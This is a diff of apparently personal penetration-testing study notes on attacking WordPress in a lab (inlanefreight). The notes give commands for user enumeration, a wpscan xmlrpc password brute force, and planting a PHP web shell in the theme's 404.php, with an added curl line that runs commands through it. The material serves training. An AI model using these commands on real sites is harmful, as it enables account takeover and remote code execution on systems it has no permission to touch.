@@ -87,7 +87,7 @@
 - > 4.7.1 wordpress user enumeration - `curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq`
 - The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.
 - `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`
-- Modify template 404.php file with - `system($_GET['cmd']);`
+- Modify template 404.php file with - `system($_GET['cmd']);` then `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`
 
 
 
